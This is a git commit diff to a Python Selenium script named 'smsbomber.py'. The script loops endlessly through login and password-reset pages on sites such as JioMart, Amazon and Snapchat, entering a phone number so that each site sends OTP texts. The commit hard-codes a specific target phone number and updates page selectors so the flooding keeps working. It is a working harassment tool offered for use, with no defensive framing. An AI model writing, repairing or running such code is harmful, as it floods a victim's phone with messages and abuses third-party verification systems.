1800aa4c0abacd999dc1ae711f542c28c204269a
Schwitz <schwitz6969@gmail.com>
2023-04-04 21:20:25 +0530

    Minor Changes

--- smsbomber.py
+++ smsbomber.py
@@ -16,19 +16,12 @@ driver = webdriver.Chrome(service=Service(
 driver.maximize_window()
 
 
-username = ''
+username = '9041063244'
 password = 'schwitz'
 
 while True:
         
 
-    driver.get("https://www.tnesevai.tn.gov.in/citizen/LoginWithMobile.aspx")
-
-
-    driver.find_element(
-        "name", "ctl00$ContentPlaceHolderTop$txtMobileNumber").send_keys(username)
-    driver.find_element(
-        "name", "ctl00$ContentPlaceHolderTop$btnGenerateOTP").click()
 
     # UBER
 
@@ -57,12 +50,14 @@ while True:
     driver.get("https://www.jiomart.com/customer/account/login")
 
     driver.find_element(
-        'xpath', "/html/body/app-root/app-layout/div/main/div/app-login/div[1]/div/div[1]/div[2]/div/div[1]/form/div[1]/input").send_keys(username)
+        'xpath', "/html/body/app-root/jds-theme/jds-container/app-layout-ds/div/main/div/app-login/jds-grid/div/jds-container[2]/section/div/form/div[1]/jds-phone/div/input").send_keys(username)
 
     driver.find_element(
-        'xpath', "/html/body/app-root/app-layout/div/main/div/app-login/div[1]/div/div[1]/div[2]/div/div[1]/form/div[2]/button[1]").click()
+        'xpath', "/html/body/app-root/jds-theme/jds-container/app-layout-ds/div/main/div/app-login/jds-grid/div/jds-container[2]/section/div/form/div[2]/jds-button/button").click()
 
 
+
+    ## AMAZON
 
     driver.get("https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&")
 
@@ -78,16 +73,8 @@ while True:
         'xpath', "/html/body/div[1]/div[1]/div[2]/div/div[2]/div[3]/form/span/span/input").click()
 
 
-    driver.get("https://pizzaonline.dominos.co.in")
-
-    driver.find_element(
-        "xpath", "/html/body/div[1]/div/div[1]/div[1]/div/div[3]/div[2]/div[1]/div[2]").click()
-    driver.find_element(
-        'name', 'loginNumber').send_keys(username)
-
-    driver.find_element(
-        "xpath", "/html/body/div[1]/div/div[1]/div[1]/div/div[3]/div[2]/div[2]/div/div[3]/div/div/div/div[2]/div/form/div[2]/input").click()
-
+ 
+    ## SNAPCHAT
 
     driver.get("https://accounts.snapchat.com/accounts/password_reset/phone")
 
@@ -97,10 +84,10 @@ while True:
             EC.presence_of_element_located((By.ID, "reset-password-by-phone"))
         )
         driver.find_element(
-            "xpath", "/html/body/div/div/div/div[3]/article/div/div[3]/form/div[1]/div/div[2]/div/input").send_keys(username)
+            "xpath", "/html/body/div/div/main/div[1]/div/div/div[3]/form/div[1]/div/div[2]/div/input").send_keys(username)
 
         driver.find_element(
-            "xpath", "/html/body/div/div/div/div[3]/article/div/div[3]/form/div[3]/button").click()
+            "xpath", "/html/body/div/div/main/div[1]/div/div/div[3]/form/div[3]/button").click()
 
     finally:
         print("s")
